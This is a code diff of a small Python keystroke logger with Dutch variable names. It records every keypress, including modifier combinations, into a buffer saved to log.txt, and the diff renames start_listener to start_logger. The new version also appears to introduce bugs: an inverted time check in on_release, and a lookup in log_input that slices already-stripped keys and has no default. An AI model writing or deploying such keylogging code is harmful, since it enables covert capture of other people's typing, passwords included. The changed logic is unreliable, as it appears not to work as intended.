@@ -39,13 +39,12 @@ def save(log_file_name: str = "log.txt") -> str:
 
 
 def on_keypress(toets):
-    print(type(toets))
     try:
-        key = toets.replace("'", "")
-        if key in MOD_KEYS:
-            mods.add(key)
+        toets_str = str(toets).replace("'", "")
+        if toets_str in MOD_KEYS:
+            mods.add(toets_str)
         else:
-            log_input(toets)
+            log_input(toets_str)
     except Exception as e:
         print(f"error: {e}")
 
@@ -53,17 +52,16 @@ def on_keypress(toets):
 def on_release(toets):
     try:
         mods.discard(str(toets).replace("'", ""))
-        if MAX_TIJD and (time.time() - start) > MAX_TIJD:
+        if time.time() - start < MAX_TIJD:
             save()
-            return False
+
     except Exception as e:
         print(f"error: {e}")
 
 
-def log_input(toets: str):
+def log_input(toets):
     try:
-        t = SPECIALE_KEYS.get(toets.replace(
-            "'", ""), toets.replace("'", ""))
+        t = SPECIALE_KEYS.get(str(toets[1:-1]))
         if mods:
             t = "+".join(sorted(mods)) + f"+{t}"
         buffer.append(t)
@@ -73,7 +71,7 @@ def log_input(toets: str):
         print(f"er ging iets mis: {e}")
 
 
-def start_listener():
+def start_logger():
     with keyboard.Listener(on_press=on_keypress, on_release=on_release):
         try:
             while time.time() - start < MAX_TIJD:
@@ -88,4 +86,4 @@ def start_listener():
 
 
 if __name__ == "__main__":
-    start_listener()
+    start_logger()
